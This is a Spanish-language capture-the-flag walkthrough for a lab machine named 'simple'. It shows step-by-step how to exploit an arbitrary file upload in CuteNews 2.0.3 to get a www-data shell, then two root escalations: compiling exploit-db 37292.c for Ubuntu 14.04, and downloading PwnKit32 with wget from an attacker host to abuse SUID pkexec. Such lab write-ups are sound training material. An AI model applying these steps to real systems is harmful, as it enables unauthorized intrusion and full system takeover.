PORT   STATE SERVICE
80/tcp open  http

-Entramos a la web y nos encontramos un panel de login con servicio y versión:
	CuteNews v.2.0.3

-Buscamos exploit para CuteNews v.2.0.3
	-Encontramos: CuteNews 2.0.3 - Arbitrary File Upload

-Los pasos para explotarlo son los siguientes:
	1-Nos creamos una cuenta
	 2 - Nos logueamos
	 3 - Vamos a personal options:  http://www.target.com/cutenews/index.php?mod=main&opt=personal
	 4 - Seleccionamos Upload Avatar Example: exploit.jpg e interceptamos la petición con BurpSuite
	 5 - Cambiamos el filename a exploit.php
		name="avatar_file"; filename="exploit.php"\r\
	6 - Ejecutamos el archivo desde : http://192.168.1.132/uploads/avatar_Username_FileName.php
		www-data@simple:/$ 


## Escalada de Privilegios

2 maneras de escalar a root:
	1-Abusando de version antigua de Ubuntu 14.04.2
	2-Abusando de /usr/bin/pkexec
	
1-Abusando de Ubuntu 14.04.2:
	-Vemos que la versión de linux del sistema es muy antigua:
		-lsb_release -a
			Release:	14.04
	-Buscamos ubuntu 14.04 Privilege escalation y hay varios exploits en .c, el único que funciona es el 37292.c , aqui se descarga:
		https://www.exploit-db.com/exploits/37292
	-Para compilar un archivo .c y poder ejecutarlo hay que hacer esto:
		gcc 37292.c -o exploit
		-Ya se podría ejecutar el exploit: 
			./exploit
			# whoami 
			root
			
2-Abusando de /usr/bin/pkexec
	-Cómo la máquina es antigua y tenemos permisos SUID en el binario 'pkexec' , escalamos privilegios con el exploit de github 'PwnKit'
	-La versión de linux es antigua y es de 32 bits, por lo que el exploit 'Pwnkit' no funciona, sin embargo, dentro de la carpeta que te descarga en github viene una versión PwnKit32 para ejecutarla en entornos de 32 bits
	-Descargamos el exploit 'Pwnkit32' en la máquina víctima , lo ejecutamos y somos root:
		-Lo descargamos: wget http://192.168.1.135/PwnKit32
		-Le damos permisos de ejecución: chmod +x PwnKit32
		-Lo ejecutamos:  ./PwnKit32
		root@simple:/tmp#